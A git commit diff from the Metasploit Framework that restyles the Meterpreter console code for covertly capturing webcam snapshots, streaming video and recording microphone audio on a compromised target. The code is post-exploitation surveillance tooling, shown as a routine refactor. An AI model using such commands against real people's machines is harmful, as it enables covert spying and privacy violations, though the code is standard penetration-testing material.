90a46fbcd0f6faf03fb02be08dbe50bc2aaf1076
Brent Cook <bcook@rapid7.com>
2015-08-24 17:58:24 -0500

    update style issues

--- lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/webcam.rb
+++ lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/webcam.rb
@@ -79,7 +79,6 @@ class Console::CommandDispatcher::Stdapi::Webcam
     quality = 50
     view    = true
     index   = 1
-    wc_list = []
 
     webcam_snap_opts = Rex::Parser::Arguments.new(
       "-h" => [ false, "Help Banner" ],
@@ -87,14 +86,14 @@ class Console::CommandDispatcher::Stdapi::Webcam
       "-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
       "-p" => [ true, "The JPEG image path (Default: '#{path}')" ],
       "-v" => [ true, "Automatically view the JPEG image (Default: '#{view}')" ]
-    )
+   )
 
-    webcam_snap_opts.parse( args ) { | opt, idx, val |
+    webcam_snap_opts.parse(args) { | opt, idx, val |
       case opt
         when "-h"
-          print_line( "Usage: webcam_snap [options]\n" )
-          print_line( "Grab a frame from the specified webcam." )
-          print_line( webcam_snap_opts.usage )
+          print_line("Usage: webcam_snap [options]\n")
+          print_line("Grab a frame from the specified webcam.")
+          print_line(webcam_snap_opts.usage)
           return
         when "-i"
           index = val.to_i
@@ -103,39 +102,30 @@ class Console::CommandDispatcher::Stdapi::Webcam
         when "-p"
           path = val
         when "-v"
-          view = false if ( val =~ /^(f|n|0)/i )
+          view = false if val =~ /^(f|n|0)/i
       end
     }
 
     begin
-      wc_list << client.webcam.webcam_list
-    rescue
+      print_status("Starting...")
+      client.webcam.webcam_start(index)
+      webcam_started = true
+      data = client.webcam.webcam_get_frame(quality)
+      print_good("Got frame")
+    ensure
+      client.webcam.webcam_stop if webcam_started
+      print_status("Stopped")
     end
-    if wc_list.length > 0
-      begin
-        print_status("Starting...")
-        client.webcam.webcam_start(index)
-        webcam_started = true
-        data = client.webcam.webcam_get_frame(quality)
-        print_good("Got frame")
-      ensure
-        client.webcam.webcam_stop if webcam_started
-        print_status("Stopped")
-      end
 
-      if( data )
-        ::File.open( path, 'wb' ) do |fd|
-          fd.write( data )
-        end
-        path = ::File.expand_path( path )
-        print_line( "Webcam shot saved to: #{path}" )
-        Rex::Compat.open_file( path ) if view
+    if data
+      ::File.open(path, 'wb') do |fd|
+        fd.write(data)
       end
-      return true
-    else
-      print_error("No webcams where found")
-      return false
+      path = ::File.expand_path(path)
+      print_line("Webcam shot saved to: #{path}")
+      Rex::Compat.open_file(path) if view
     end
+    true
   end
 
   def cmd_webcam_chat(*args)
@@ -149,17 +139,17 @@ class Console::CommandDispatcher::Stdapi::Webcam
     webcam_chat_opts = Rex::Parser::Arguments.new(
       "-h" => [ false, "Help banner"],
       "-s" => [ false, "WebSocket server" ]
-    )
+   )
 
-    webcam_chat_opts.parse( args ) { | opt, idx, val |
+    webcam_chat_opts.parse(args) { | opt, idx, val |
       case opt
         when "-h"
-          print_line( "Usage: webcam_chat [options]\n" )
-          print_line( "Starts a video conversation with your target." )
-          print_line( "Browser Requirements:")
-          print_line( "Chrome: version 23 or newer" )
-          print_line( "Firefox: version 22 or newer" )
-          print_line( webcam_chat_opts.usage )
+          print_line("Usage: webcam_chat [options]\n")
+          print_line("Starts a video conversation with your target.")
+          print_line("Browser Requirements:")
+          print_line("Chrome: version 23 or newer")
+          print_line("Firefox: version 22 or newer")
+          print_line(webcam_chat_opts.usage)
           return
         when "-s"
           server = val.to_s
@@ -188,7 +178,6 @@ class Console::CommandDispatcher::Stdapi::Webcam
     quality  = 50
     view     = true
     index    = 1
-    wc_list  = []
 
     webcam_snap_opts = Rex::Parser::Arguments.new(
       "-h" => [ false, "Help Banner" ],
@@ -200,30 +189,30 @@ class Console::CommandDispatcher::Stdapi::Webcam
       "-v" => [ true, "Automatically view the stream (Default: '#{view}')" ]
     )
 
-    webcam_snap_opts.parse( args ) { | opt, idx, val |
+    webcam_snap_opts.parse(args) { |opt, _idx, val|
       case opt
-        when "-h"
-          print_line( "Usage: webcam_stream [options]\n" )
-          print_line( "Stream from the specified webcam." )
-          print_line( webcam_snap_opts.usage )
-          return
-        when "-d"
-          duration = val.to_i
-        when "-i"
-          index = val.to_i
-        when "-q"
-          quality = val.to_i
-        when "-s"
-          stream_path = val
-        when "-t"
-          player_path = val
-        when "-v"
-          view = false if ( val =~ /^(f|n|0)/i )
+      when "-h"
+        print_line("Usage: webcam_stream [options]\n")
+        print_line("Stream from the specified webcam.")
+        print_line(webcam_snap_opts.usage)
+        return
+      when "-d"
+        duration = val.to_i
+      when "-i"
+        index = val.to_i
+      when "-q"
+        quality = val.to_i
+      when "-s"
+        stream_path = val
+      when "-t"
+        player_path = val
+      when "-v"
+        view = false if val =~ /^(f|n|0)/i
       end
     }
 
     print_status("Preparing player...")
-    html = %Q|<html>
+    html = %|<html>
 <head>
 <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
 <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
@@ -285,17 +274,17 @@ Status     : <span id="status"></span>
     begin
       client.webcam.webcam_start(index)
       webcam_started = true
-      ::Timeout.timeout(duration) {
+      ::Timeout.timeout(duration) do
         while client do
           data = client.webcam.webcam_get_frame(quality)
           if data
             ::File.open(stream_path, 'wb') do |f|
-             f.write(data)
+              f.write(data)
             end
             data = nil
           end
         end
-      }
+      end
     rescue ::Timeout::Error
     ensure
       client.webcam.webcam_stop if webcam_started
@@ -312,39 +301,39 @@ Status     : <span id="status"></span>
     record_mic_opts = Rex::Parser::Arguments.new(
       "-h" => [ false, "Help Banner" ],
       "-d" => [ true, "Number of seconds to record (Default: 1)" ],
-      "-f" => [ true, "The wav file path (Default: '#{::File.expand_path( "[randomname].wav" )}')" ],
+      "-f" => [ true, "The wav file path (Default: '#{::File.expand_path("[randomname].wav")}')" ],
       "-p" => [ true, "Automatically play the captured audio (Default: '#{play}')" ]
     )
 
-    record_mic_opts.parse( args ) { | opt, idx, val |
+    record_mic_opts.parse(args) do |opt, _idx, val|
       case opt
-        when "-h"
-          print_line( "Usage: record_mic [options]\n" )
-          print_line( "Records audio from the default microphone." )
-          print_line( record_mic_opts.usage )
-          return
-        when "-d"
-          duration = val.to_i
-        when "-f"
-          path = val
-        when "-p"
-          play = false if ( val =~ /^(f|n|0)/i )
+      when "-h"
+        print_line("Usage: record_mic [options]\n")
+        print_line("Records audio from the default microphone.")
+        print_line(record_mic_opts.usage)
+        return
+      when "-d"
+        duration = val.to_i
+      when "-f"
+        path = val
+      when "-p"
+        play = false if val =~ /^(f|n|0)/i
       end
-    }
+    end
 
     print_status("Starting...")
     data = client.webcam.record_mic(duration)
     print_status("Stopped")
 
-    if( data )
-      ::File.open( path, 'wb' ) do |fd|
-        fd.write( data )
+    if data
+      ::File.open(path, 'wb') do |fd|
+        fd.write(data)
       end
-      path = ::File.expand_path( path )
-      print_line( "Audio saved to: #{path}" )
-      Rex::Compat.play_sound( path ) if play
+      path = ::File.expand_path(path)
+      print_line("Audio saved to: #{path}")
+      Rex::Compat.play_sound(path) if play
     end
-    return true
+    true
   end
 end
 end
